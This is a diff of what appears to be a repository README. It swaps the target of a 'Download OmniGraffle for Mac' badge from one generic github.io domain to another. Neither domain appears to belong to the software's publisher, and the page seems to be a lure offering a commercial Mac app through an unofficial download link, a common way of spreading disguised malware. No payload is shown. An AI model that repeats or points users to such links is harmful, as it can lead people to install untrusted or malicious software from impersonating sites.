@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/omnigraffle">  
+<a href="https://osx-app.github.io/.github/omnigraffle">  
 <img src="https://img.shields.io/badge/⬇️_Download_OmniGraffle_for_Mac-blue?style=for-the-badge&logo=apple" alt="Download OmniGraffle for Mac">  
 </a>  
 </div>  
